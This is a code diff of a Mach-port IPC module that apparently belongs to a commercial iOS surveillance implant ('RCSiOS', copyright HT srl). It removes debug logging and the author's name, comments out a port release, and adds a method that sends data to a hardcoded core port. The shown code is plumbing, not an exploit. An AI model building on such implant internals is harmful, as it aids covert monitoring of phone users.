@@ -1,9 +1,9 @@
 /*
- * RCSIpony - IPC through machport
+ * RCSiOS - IPC through machport
  *  since shmget = ENOSYS
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 11/09/2009
+ * Created on 11/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  * Adapted from RCSMac by Massimo Chiodini on 05/03/2010
  *
@@ -300,6 +300,7 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
 #endif
     }
   
+  // CHRASh--
   if(mMemPort != NULL)
     CFRelease(mMemPort);
   
@@ -354,7 +355,7 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
       CFRunLoopRemoveSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
       CFRelease(mRLSource);
       CFMessagePortInvalidate(mMemPort);
-      CFRelease(mMemPort);
+      //CFRelease(mMemPort);
     }
   
   for (i=0; i < [mRemotePorts count]; i++) 
@@ -1044,16 +1045,13 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
   
   if (mMemPort == NULL) 
     {
-#ifdef DEBUG
-      NSLog(@"%s: cannot create %@ local port", __FUNCTION__, mFilename);
-#endif
       return 1;
     }
   
   mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
   
   CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
-  //CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kRCSICoreMainRunLoop);
+
   return 0;
 }
 
@@ -1071,7 +1069,6 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
   
   return tmpQueue;
 }
-
 
 typedef struct _coreMessage_t
 {
@@ -1111,9 +1108,7 @@ typedef struct _coreMessage_t
   
   if( err != KERN_SUCCESS )
     {
-#ifdef DEBUG
-      NSLog(@"%s: error sending message to port %d, [%#x]", __FUNCTION__, port, err);
-#endif
+      return FALSE;
     }
   else
     {
@@ -1125,4 +1120,36 @@ typedef struct _coreMessage_t
   return TRUE;
 }
 
++ (BOOL)sendMessageToCoreMachPort:(NSData*)aData withMode:(NSString*)aMode
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  CFStringRef corePortName = CFSTR("78shfu");
+  
+  CFMessagePortRef corePort = CFMessagePortCreateRemote(kCFAllocatorDefault, corePortName);
+  
+  CFDataRef retData   = NULL;
+  SInt32 sndRet;
+  
+  sndRet = CFMessagePortSendRequest(corePort, 
+                                    0, 
+                                    (CFDataRef)aData, 
+                                    0.5, 
+                                    0.5, 
+                                    (CFStringRef)aMode,//kCFRunLoopDefaultMode, 
+                                    &retData);
+  
+  if (sndRet == kCFMessagePortSuccess) 
+    {
+#ifdef DEBUG
+      NSLog(@"%s: data send to machport correctly", __FUNCTION__);
+#endif
+    } 
+  
+  CFRelease(corePort);
+  
+  [pool release];
+  
+  return TRUE;
+}
 @end
